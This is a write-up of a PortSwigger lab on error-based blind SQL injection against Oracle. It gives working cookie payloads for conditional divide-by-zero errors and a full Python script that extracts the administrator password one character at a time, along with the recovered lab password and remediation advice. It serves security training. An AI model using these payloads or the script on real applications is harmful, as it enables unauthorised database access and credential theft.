# PortSwigger Lab: Blind SQL Injection — Error-Based Extraction (Oracle)

**Author:** Neelesh Pandey  
**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Practitioner  
**Category:** SQL Injection / Blind Error-Based  
**Database:** Oracle  

---

## Overview

This lab demonstrates blind SQL injection where the application does not return query results directly — instead, it reveals information through **conditional error responses**. By crafting payloads that trigger a divide-by-zero error only when a condition is true, it is possible to extract data one character at a time.

What makes this writeup different from a standard lab walkthrough: instead of manually cycling through 20 character positions × 36 characters using Burp Intruder, a **custom Python script** was written to automate the full password extraction — completing in seconds what would take minutes manually.

---

## Vulnerability

The application uses a `TrackingId` cookie value in a SQL query without proper sanitisation. The query is executed server-side against an Oracle database. The application does not return query output, but returns HTTP 500 when a SQL error occurs and HTTP 200 normally — this difference in response codes is the oracle (information channel) for data extraction.

---

## Methodology

```
Confirm injection → Identify database → Verify table exists →
Trigger conditional errors → Determine password length →
Extract password character by character → Automate with Python
```

---

## 1. Confirming the Injection Point

### Step 1 — Basic Injection Test

Modified the `TrackingId` cookie in Burp:

```
TrackingId=xyz'
```

Response: HTTP 500 — syntax error triggered by unclosed quote.

```
TrackingId=xyz''
```

Response: HTTP 200 — error disappeared, confirming SQL injection point.

### Step 2 — Identify Database Type

Tested a subquery to confirm SQL execution:

```
TrackingId=xyz'||(SELECT '' FROM dual)||'
```

Response: HTTP 200 — `dual` is an Oracle-specific table. **Database confirmed as Oracle.**

```
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
```

Response: HTTP 500 — non-existent table triggers error, confirming the injection is being processed as SQL.

### Step 3 — Verify Target Table Exists

```
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

Response: HTTP 200 — `users` table confirmed to exist. `ROWNUM = 1` prevents multiple rows breaking the concatenation.

---

## 2. Conditional Error Technique

The core technique uses a `CASE` statement that divides by zero only when a condition is true:

```sql
SELECT CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE '' END FROM dual
```

| Condition | Result | HTTP Response |
|-----------|--------|---------------|
| True | 1/0 executed → SQL error | 500 |
| False | Empty string returned | 200 |

### Verify the Technique Works

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
→ HTTP 500 (condition true — error triggered)

```
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
→ HTTP 200 (condition false — no error)

### Confirm Administrator User Exists

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
→ HTTP 500 — administrator user confirmed to exist.

---

## 3. Determine Password Length

Iterated through password lengths using `LENGTH()`:

```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Continued incrementing until the error disappeared — confirming **password length = 20 characters**.

---

## 4. Password Extraction

### Manual Approach (Burp Intruder)

For each character position, the payload structure is:

```sql
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' 
THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

`SUBSTR(password, position, 1)` extracts one character at the given position. When the character matches, divide-by-zero triggers HTTP 500 — revealing the correct character.

This requires 20 positions × 36 characters (a-z, 0-9) = up to **720 requests** manually in Burp Intruder.

---

## 5. Custom Python Automation

Instead of running 720 manual requests through Burp Intruder, a Python script was written to automate the full extraction:

```python
import requests
import string
import time

url = "https://<lab-id>.web-security-academy.net/"
tracking_id = "<your-tracking-id>"
session_cookie = "<your-session-cookie>"

charset = string.ascii_lowercase + string.digits
password = ""

for position in range(1, 21):
    print(f"[+] Position {position}")
    for char in charset:
        payload = (
            f"{tracking_id}'||("
            f"SELECT CASE WHEN (username='administrator' AND "
            f"SUBSTR(password,{position},1)='{char}') "
            f"THEN TO_CHAR(1/0) ELSE '' END "
            f"FROM users WHERE ROWNUM=1"
            f")||'"
        )
        cookies = {
            "TrackingId": payload,
            "session": session_cookie
        }
        try:
            response = requests.get(url, cookies=cookies, timeout=5)
            if response.status_code == 500:
                print(f"[✔] Found: {char}")
                password += char
                with open("progress.txt", "w") as f:
                    f.write(password)
                break
        except requests.exceptions.RequestException:
            print("[!] Network issue... retrying")
            time.sleep(2)
            continue
    else:
        print("[!] No match found")

print(f"\n[🔥] Password: {password}")
```

### Script Output

```
[+] Position 1  → g
[+] Position 2  → a
[+] Position 3  → k
[+] Position 4  → f
[+] Position 5  → k
[+] Position 6  → q
[+] Position 7  → 7
[+] Position 8  → c
[+] Position 9  → n
[+] Position 10 → m
[+] Position 11 → e
[+] Position 12 → m
[+] Position 13 → l
[+] Position 14 → 9
[+] Position 15 → k
[+] Position 16 → g
[+] Position 17 → p
[+] Position 18 → v
[+] Position 19 → h
[+] Position 20 → r

[🔥] Password: gakfkq7cnmeml9kgpvhr
```

---

## 6. Why the Script Works

| Component | Purpose |
|-----------|---------|
| `SUBSTR(password, position, 1)` | Extracts one character at specified position |
| `CASE WHEN ... THEN TO_CHAR(1/0)` | Triggers divide-by-zero only when character matches |
| `HTTP 500` response | Signals correct character found |
| `HTTP 200` response | Wrong character — move to next |
| `ROWNUM=1` | Prevents Oracle returning multiple rows |
| `progress.txt` save | Preserves progress if script interrupted |

---

## 7. Attack Flow Summary

```
Inject ' → Confirm error → Identify Oracle DB → Verify users table
        ↓
Conditional CASE error technique confirmed
        ↓
Password length = 20 characters
        ↓
Python script: 20 positions × 36 chars = up to 720 requests
        ↓
HTTP 500 = match found → character extracted
        ↓
Password: gakfkq7cnmeml9kgpvhr → Login as administrator
```

---

## 8. Key Takeaways

- **Blind SQLi uses side channels** — when no output is returned, the difference between HTTP 200 and 500 becomes the data channel
- **Oracle requires `FROM dual`** — unlike MySQL/MSSQL, Oracle's SELECT always needs a table; `dual` is the standard dummy table
- **`ROWNUM=1` is Oracle-specific** — prevents multiple row errors when querying tables; equivalent to `LIMIT 1` in MySQL
- **Divide-by-zero is a reliable error trigger** — `TO_CHAR(1/0)` always causes a SQL error in Oracle, making it ideal for conditional error injection
- **Automating with Python beats Burp Intruder** — writing a custom script shows deeper understanding than running a GUI tool; the script is also reusable across different labs and real engagements
- **Save progress during extraction** — long extractions can be interrupted; writing to `progress.txt` after each character prevents losing work

---

## 9. Real-World Relevance

Error-based blind SQLi appears in applications that:
- Log user activity using unsanitised cookie or header values
- Use Oracle databases (common in enterprise environments)
- Show different HTTP status codes based on query success/failure

In real bug bounty programs, this technique applies anywhere a parameter influences a database query and the response differs based on query success — even subtle differences like response time, content length, or error messages.

---

## 10. Remediation

| Finding | Risk | Fix |
|---------|------|-----|
| Unsanitised TrackingId in SQL query | Critical | Use parameterised queries / prepared statements |
| Oracle error messages leaked via HTTP 500 | High | Return generic error pages; never expose DB errors |
| No input validation on cookie values | High | Validate and sanitise all user-controlled input |

**Secure code example (Java):**
```java
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM tracking WHERE id = ?"
);
stmt.setString(1, trackingId);
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite Professional | Proxy, request interception, initial testing |
| Burp Repeater | Manual payload testing and confirmation |
| Burp Intruder | Character position testing reference |
| Python (requests library) | Custom automation script for full password extraction |

---

## References

- [PortSwigger — Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

---

*Write-up by Neelesh Pandey — [GitHub](https://github.com/Neelesh707) | [LinkedIn](https://www.linkedin.com/in/neelesh-pandey021/)*
